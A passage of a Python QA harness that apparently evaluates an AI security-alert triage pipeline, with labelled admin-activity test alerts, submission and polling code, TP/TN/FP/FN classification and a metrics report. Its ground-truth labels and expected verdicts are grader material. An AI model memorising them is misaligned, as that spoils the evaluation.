                "changes": ["Password policy update"],
                "change_ticket": "CHG0012890"
            }
        ),
        TestAlert(
            title="Emergency Access Usage",
            description="Break-glass account used for emergency",
            category="admin_activity",
            severity="high",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="SUSPICIOUS",
            raw_event={
                "event_type": "privileged_access",
                "user": "DOMAIN\\break_glass_admin",
                "reason": "DC-01 unresponsive",
                "incident": "INC0045678",
                "approved_by": "manager.carol"
            },
            notes="Legitimate emergency access with incident reference"
        ),
        TestAlert(
            title="Software Installation by IT",
            description="IT installing approved software",
            category="admin_activity",
            severity="low",
            ground_truth=GroundTruth.TRUE_NEGATIVE,
            expected_verdict="BENIGN",
            raw_event={
                "event_type": "software_install",
                "software": "Visual Studio 2026",
                "user": "DOMAIN\\admin.david",
                "target_host": "DEV-WS-15",
                "request_ticket": "REQ0078901"
            }
        ),
    ])

    return alerts


# ============================================================================
# TEST EXECUTION
# ============================================================================

async def reset_test_alerts(conn: asyncpg.Connection):
    """Remove all test alerts from previous runs"""
    result = await conn.execute(
        "DELETE FROM alerts WHERE alert_id LIKE 'QA-%'"
    )
    deleted = int(result.split()[-1]) if result else 0
    print(f"[RESET] Deleted {deleted} previous test alerts")


async def submit_test_alert(client: httpx.AsyncClient, alert: TestAlert) -> Tuple[str, float]:
    """Submit a single test alert and return (alert_id, latency_ms)"""
    payload = {
        "title": alert.title,
        "description": alert.description,
        "category": alert.category,
        "severity": alert.severity,
        "test_id": alert.test_id,
        "ground_truth": alert.ground_truth.value,
        "expected_verdict": alert.expected_verdict,
        **alert.raw_event
    }

    start_time = time.time()
    response = await client.post(
        f"{BACKEND_URL}/api/v1/webhooks/ingest/{WEBHOOK_NAME}",
        json=payload,
        headers={"Content-Type": "application/json"}
    )
    elapsed_ms = (time.time() - start_time) * 1000

    if response.status_code != 200:
        print(f"[ERROR] Failed to submit {alert.test_id}: {response.text}")
        return None, elapsed_ms

    data = response.json()
    return data.get("alert_id"), elapsed_ms


async def wait_for_processing(conn: asyncpg.Connection, alert_ids: List[str], timeout_seconds: int = 180):
    """Wait for all alerts to be processed by T1"""
    print(f"\n[WAIT] Waiting for T1 processing (max {timeout_seconds}s)...")
    start = time.time()

    while time.time() - start < timeout_seconds:
        # Check how many are still pending
        pending = await conn.fetchval("""
            SELECT COUNT(*) FROM alerts
            WHERE alert_id = ANY($1::text[])
              AND triage_status = 'pending'
              AND ai_verdict IS NULL
        """, alert_ids)

        blocked = await conn.fetchval("""
            SELECT COUNT(*) FROM alerts
            WHERE alert_id = ANY($1::text[])
              AND triage_status = 'blocked'
        """, alert_ids)

        completed = len(alert_ids) - pending - blocked
        elapsed = int(time.time() - start)
        print(f"  [{elapsed}s] Completed: {completed}, Pending: {pending}, Blocked: {blocked}")

        if pending == 0:
            print(f"[DONE] All alerts processed in {elapsed}s")
            return True

        await asyncio.sleep(POLL_INTERVAL_SECONDS)

    print(f"[TIMEOUT] Processing did not complete within {timeout_seconds}s")
    return False


async def collect_results(conn: asyncpg.Connection, test_alerts: List[TestAlert]) -> List[TestResult]:
    """Collect results for all test alerts"""
    results = []

    for alert in test_alerts:
        row = await conn.fetchrow("""
            SELECT alert_id, ai_verdict, ai_confidence, ai_reasoning,
                   triage_status, triage_blocked_reason,
                   enrichment_status, enrichment_summary,
                   created_at, updated_at
            FROM alerts
            WHERE raw_event->>'test_id' = $1
        """, alert.test_id)

        if not row:
            print(f"[WARN] Alert not found for test_id: {alert.test_id}")
            continue

        result = TestResult(
            test_alert=alert,
            alert_id=row['alert_id'],
            ai_verdict=row['ai_verdict'],
            ai_confidence=float(row['ai_confidence']) if row['ai_confidence'] else None,
            ai_reasoning=row['ai_reasoning'],
            triage_status=row['triage_status'],
            triage_blocked_reason=row['triage_blocked_reason'],
            enrichment_status=row['enrichment_status'],
            enrichment_summary=row['enrichment_summary'] if row['enrichment_summary'] else {}
        )

        # Calculate processing time
        if row['created_at'] and row['updated_at']:
            delta = row['updated_at'] - row['created_at']
            result.processing_time_ms = delta.total_seconds() * 1000

        # Classify result (TP, TN, FP, FN)
        result = classify_result(result)
        results.append(result)

    return results


def classify_result(result: TestResult) -> TestResult:
    """Classify a result as TP, TN, FP, or FN"""
    verdict = (result.ai_verdict or "").upper()
    expected = result.test_alert.expected_verdict.upper()
    ground_truth = result.test_alert.ground_truth

    # Map verdicts to binary:
    # - MALICIOUS, SOCIAL_ENGINEERING, SUSPICIOUS, NEEDS_INVESTIGATION = Positive (requires action/review)
    # - BENIGN, UNKNOWN, N/A = Negative (cleared)
    # Note: NEEDS_INVESTIGATION is treated as positive because it indicates
    # the AI found something worth investigating (not clearing as benign)
    # Note: SOCIAL_ENGINEERING is a positive verdict - it's malicious intent without IOC evidence
    is_positive_verdict = verdict in ["MALICIOUS", "SOCIAL_ENGINEERING", "SUSPICIOUS", "NEEDS_INVESTIGATION"]
    expected_positive = expected in ["MALICIOUS", "SUSPICIOUS", "SOCIAL_ENGINEERING"]

    # Track if it was a soft positive (NEEDS_INVESTIGATION) vs definitive
    # SOCIAL_ENGINEERING is definitive, not soft
    result.is_soft_positive = verdict == "NEEDS_INVESTIGATION"

    # Ground truth determines actual state
    is_actually_malicious = ground_truth in [GroundTruth.TRUE_POSITIVE, GroundTruth.FALSE_POSITIVE_RISK]

    if is_positive_verdict and is_actually_malicious:
        result.classification = "TP"
        result.is_correct = True
    elif not is_positive_verdict and not is_actually_malicious:
        result.classification = "TN"
        result.is_correct = True
    elif is_positive_verdict and not is_actually_malicious:
        result.classification = "FP"
        result.is_correct = False
    else:  # not is_positive_verdict and is_actually_malicious
        result.classification = "FN"
        result.is_correct = False

    return result


def calculate_metrics(results: List[TestResult]) -> TestMetrics:
    """Calculate aggregated metrics from results"""
    metrics = TestMetrics()
    metrics.total_alerts = len(results)

    latencies = []

    for r in results:
        # Count by triage status
        if r.triage_status == "blocked":
            metrics.blocked_alerts += 1
        else:
            metrics.processed_alerts += 1

        # Confusion matrix
        if r.classification == "TP":
            metrics.true_positives += 1
            # Track soft vs definitive positives
            if r.is_soft_positive:
                metrics.soft_positives += 1
            else:
                metrics.definitive_positives += 1
        elif r.classification == "TN":
            metrics.true_negatives += 1
        elif r.classification == "FP":
            metrics.false_positives += 1
            # Collect FP root cause
            metrics.fp_root_causes.append({
                "alert_id": r.alert_id,
                "title": r.test_alert.title,
                "category": r.test_alert.category,
                "expected": r.test_alert.expected_verdict,
                "actual": r.ai_verdict or "N/A",
                "confidence": r.ai_confidence or 0,
                "reasoning": r.ai_reasoning[:200] if r.ai_reasoning else None,
                "ground_truth": r.test_alert.ground_truth.value
            })
        elif r.classification == "FN":
            metrics.false_negatives += 1

        # By category
        cat = r.test_alert.category
        if cat not in metrics.by_category:
            metrics.by_category[cat] = {"TP": 0, "TN": 0, "FP": 0, "FN": 0, "total": 0}
        metrics.by_category[cat][r.classification or "unknown"] = \
            metrics.by_category[cat].get(r.classification or "unknown", 0) + 1
        metrics.by_category[cat]["total"] += 1

        # Latency
        if r.processing_time_ms:
            latencies.append(r.processing_time_ms)

    # Calculate latency percentiles
    if latencies:
        latencies.sort()
        metrics.avg_latency_ms = sum(latencies) / len(latencies)
        metrics.p50_latency_ms = latencies[len(latencies) // 2]
        metrics.p95_latency_ms = latencies[int(len(latencies) * 0.95)]
        metrics.p99_latency_ms = latencies[int(len(latencies) * 0.99)]

    return metrics


def generate_report(metrics: TestMetrics, results: List[TestResult]) -> str:
    """Generate comprehensive test report"""

    # Calculate derived metrics
    precision = metrics.true_positives / (metrics.true_positives + metrics.false_positives) \
        if (metrics.true_positives + metrics.false_positives) > 0 else 0
    recall = metrics.true_positives / (metrics.true_positives + metrics.false_negatives) \
        if (metrics.true_positives + metrics.false_negatives) > 0 else 0
    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0

    fpr = metrics.false_positives / (metrics.false_positives + metrics.true_negatives) \
        if (metrics.false_positives + metrics.true_negatives) > 0 else 0
    fnr = metrics.false_negatives / (metrics.false_negatives + metrics.true_positives) \
        if (metrics.false_negatives + metrics.true_positives) > 0 else 0

    accuracy = (metrics.true_positives + metrics.true_negatives) / metrics.total_alerts \
        if metrics.total_alerts > 0 else 0

    report = f"""
================================================================================
                    T1 AGENTICS PIPELINE QA TEST REPORT
                    Generated: {datetime.now().isoformat()}
================================================================================

EXECUTIVE SUMMARY
-----------------
Total Test Alerts:  {metrics.total_alerts}
Processed:          {metrics.processed_alerts}
Blocked (gating):   {metrics.blocked_alerts}

ACCURACY METRICS
----------------
Accuracy:           {accuracy:.1%}
Precision:          {precision:.1%}
Recall:             {recall:.1%}
F1 Score:           {f1:.3f}

FALSE POSITIVE RATE (FPR): {fpr:.1%}
FALSE NEGATIVE RATE (FNR): {fnr:.1%}

CONFUSION MATRIX
----------------
                    Predicted
                 Positive  Negative
Actual  Positive    {metrics.true_positives:4d}      {metrics.false_negatives:4d}     (TP / FN)
        Negative    {metrics.false_positives:4d}      {metrics.true_negatives:4d}     (FP / TN)

TRUE POSITIVE BREAKDOWN
-----------------------
Definitive (MALICIOUS/SUSPICIOUS): {metrics.definitive_positives}
Soft (NEEDS_INVESTIGATION):        {metrics.soft_positives}
Note: NEEDS_INVESTIGATION = AI flagged for human review (not cleared as BENIGN)

LATENCY METRICS
---------------
Average:    {metrics.avg_latency_ms:.0f} ms
P50:        {metrics.p50_latency_ms:.0f} ms
P95:        {metrics.p95_latency_ms:.0f} ms
P99:        {metrics.p99_latency_ms:.0f} ms

RESULTS BY CATEGORY
-------------------
"""

    for cat, stats in sorted(metrics.by_category.items()):
        cat_total = stats['total']
        cat_accuracy = (stats.get('TP', 0) + stats.get('TN', 0)) / cat_total if cat_total > 0 else 0
        report += f"""
{cat.upper()}:
  Total: {cat_total}  |  TP: {stats.get('TP', 0)}  TN: {stats.get('TN', 0)}  FP: {stats.get('FP', 0)}  FN: {stats.get('FN', 0)}
  Accuracy: {cat_accuracy:.1%}
"""

    # False Positive Analysis
    if metrics.fp_root_causes:
        report += """
================================================================================
                    FALSE POSITIVE ANALYSIS
================================================================================
"""
        for i, fp in enumerate(metrics.fp_root_causes, 1):
            report += f"""
FP #{i}: {fp['title']}
  Alert ID:    {fp['alert_id']}
  Category:    {fp['category']}
  Expected:    {fp['expected']}
  Actual:      {fp['actual']} ({fp['confidence']:.0f}% confidence)
  Ground Truth:{fp['ground_truth']}
  Reasoning:   {fp['reasoning'] or 'N/A'}
---
"""

    # False Negative Analysis
    fn_results = [r for r in results if r.classification == "FN"]
    if fn_results:
        report += """
================================================================================
                    FALSE NEGATIVE ANALYSIS
================================================================================
"""
        for i, fn in enumerate(fn_results, 1):
            conf_str = f"{fn.ai_confidence:.0f}%" if fn.ai_confidence else "N/A"
            report += f"""
FN #{i}: {fn.test_alert.title}
  Alert ID:    {fn.alert_id}
  Category:    {fn.test_alert.category}
  Expected:    {fn.test_alert.expected_verdict}
  Actual:      {fn.ai_verdict or 'N/A'} ({conf_str} confidence)
  Ground Truth:{fn.test_alert.ground_truth.value}
  Notes:       {fn.test_alert.notes}
---
"""

    # Blocked alerts analysis
    blocked_results = [r for r in results if r.triage_status == "blocked"]
    if blocked_results:
        report += """
================================================================================
                    BLOCKED ALERTS ANALYSIS
================================================================================
"""
        for r in blocked_results:
            report += f"""
  {r.alert_id}: {r.triage_blocked_reason}
"""

    report += """
================================================================================
                    TEST COMPLETION
================================================================================
"""

    return report


async def main():
    """Main test execution"""
    reset_db = "--reset" in sys.argv
    wait_minutes = 3
    for i, arg in enumerate(sys.argv):
        if arg == "--wait-minutes" and i + 1 < len(sys.argv):
            wait_minutes = int(sys.argv[i + 1])

    print("=" * 80)
    print("          T1 AGENTICS PIPELINE QA TEST SUITE")
    print("=" * 80)
    print()

    # Connect to database
    try:
        conn = await asyncpg.connect(DB_URL)
        print("[OK] Connected to database")
    except Exception as e:
        print(f"[ERROR] Failed to connect to database: {e}")
        return 1

    # Get test alerts
    test_alerts = get_test_alerts()
    print(f"[OK] Loaded {len(test_alerts)} test alerts")

    # Count by category
    categories = {}
    for a in test_alerts:
        categories[a.category] = categories.get(a.category, 0) + 1
    print(f"    Categories: {categories}")

    # Reset if requested
    if reset_db:
        await reset_test_alerts(conn)

    # Submit all test alerts
    print(f"\n[SUBMIT] Submitting {len(test_alerts)} test alerts...")
    alert_ids = []
    submit_latencies = []

    async with httpx.AsyncClient(timeout=120.0) as client:
        for i, alert in enumerate(test_alerts):
            alert_id, latency = await submit_test_alert(client, alert)
            if alert_id:
                alert_ids.append(alert_id)
                submit_latencies.append(latency)
                if (i + 1) % 10 == 0:
                    print(f"    Submitted {i + 1}/{len(test_alerts)}...")

    print(f"[OK] Submitted {len(alert_ids)} alerts successfully")
    print(f"    Average submission latency: {sum(submit_latencies)/len(submit_latencies):.0f}ms")

    # Wait for T1 processing
    await wait_for_processing(conn, alert_ids, timeout_seconds=wait_minutes * 60)

    # Collect results
    print("\n[COLLECT] Collecting test results...")
    results = await collect_results(conn, test_alerts)
    print(f"[OK] Collected {len(results)} results")

    # Calculate metrics
    metrics = calculate_metrics(results)

    # Generate report
    report = generate_report(metrics, results)
    print(report)

    # Save report to file (use /app in container or /tmp as fallback)
    report_file = f"/app/qa_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        with open(report_file, 'w') as f:
            f.write(report)
        print(f"\n[SAVED] Report saved to: {report_file}")
    except Exception as e:
        print(f"\n[WARN] Could not save report: {e}")

    await conn.close()
    return 0


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)
